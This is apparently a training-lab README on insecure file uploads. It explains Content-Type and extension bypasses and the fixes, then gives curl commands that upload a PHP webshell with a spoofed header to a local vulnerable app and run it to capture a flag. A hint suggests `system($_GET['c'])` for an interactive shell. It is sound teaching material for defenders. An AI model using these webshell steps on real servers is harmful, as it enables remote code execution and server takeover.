# insecure-file-upload

## Concepts

An upload feature is **insecure** when the server keeps or serves whatever it receives without
checking what the file actually is. Once an attacker can place an **executable script** (PHP, JSP, …) in a
directory the web server runs, browsing to that file executes attacker code — a **webshell**, and
from there full **remote code execution (RCE)**.

- **Why it matters.** One weak upload form becomes code execution as the web process: read data, plant
  backdoors, pivot into the network. In the OWASP Top 10 it falls under *Insecure Design* and *Security
  Misconfiguration*, and it is one of the most common ways a whole server gets taken over.
- **The weak checks apps get wrong.** Believing the **`Content-Type` header** from the client, or checking
  nothing but the **file extension**. The client writes that header itself, so a request can say
  `Content-Type: image/png` for a file that is really `shell.php`. If the app saves by the original
  filename into a served directory, requesting `/uploads/shell.php` runs it.
- **Bypass variations.** Double extensions (`shell.php.jpg`), null bytes, case tricks (`.pHp`), or a
  content-type that lies about a script.
- **The fix.** Check **what the bytes are** (the file signature, or magic bytes), give every upload a
  **new random name**, keep uploads **outside the web root**, and make sure the server **never runs
  them**.

This lab's `/upload.php` checks **only the `Content-Type` header** and saves files by their original
name into `uploads/`, which Apache executes.

## Tasks

Start the lab with `./lab up insecure-file-upload`, then open a shell:
`./lab shell insecure-file-upload`. Snapvault runs at `http://localhost` — drive it with `curl`.

1. **Recon** — upload a normal image, then try a script, and watch the check:
   ```
   printf 'PNG fake' > a.png
   curl -s -F 'photo=@a.png;type=image/png' http://localhost/upload.php        # accepted
   printf '<?php echo 1; ?>' > shell.php
   curl -s -F 'photo=@shell.php;type=application/x-php' http://localhost/upload.php   # 415 rejected
   ```
   The app rejects the script **only** because of the `Content-Type` you sent.
2. **Exploit** — send a PHP webshell but **spoof the `Content-Type`** so the check passes, then browse
   the uploaded file to execute it:
   ```
   cat > shell.php <<'PHP'
   <?php file_put_contents('/flag/solved', "pwned by ".trim(shell_exec('id -un'))."\n"); echo 'ok'; ?>
   PHP
   curl -s -F 'photo=@shell.php;type=image/png;filename=shell.php' http://localhost/upload.php
   curl -s http://localhost/uploads/shell.php      # executes -> prints "ok"
   ```
   (If the response shows the raw `<?php …` instead of `ok`, it was served as source, not executed —
   re-check the extension.)
3. **Capture the flag** — your webshell wrote it on execution; confirm:
   ```
   cat /flag/solved
   ```
4. **Record your findings** in `/root/answers.txt` (`TRUSTED_HEADER`, `BYPASS`, `FIX`).

Check your work from the host: `./lab check insecure-file-upload`.

<details>
<summary>Hints</summary>

- With curl, `-F 'photo=@shell.php;type=image/png'` sets the multipart `Content-Type` to `image/png`
  regardless of the real file — that's the whole trick.
- Keep the filename ending in `.php` so Apache runs it; `shell.php.jpg` would be served as an image.
- The webshell can do anything the `www-data` user can: `file_put_contents('/flag/solved', ...)`, or
  `system($_GET['c'])` for an interactive shell.
- For the fix, any of: magic-byte validation, random server-side name, storing outside the web root,
  or never serving uploads as executable.

</details>

## My notes

<!-- Screenshots: ./lab shot insecure-file-upload ~/Screenshots/<file>.png <name>, then link it as
     ![what it shows](screenshots/<name>.png). Prefer code blocks for terminal output. -->

## Related

- `reflected-xss`, `sqli-auth-bypass` — other web attacks on the same app layer.
- `waf-modsecurity-crs` — the WAF that would try to block an upload like this.
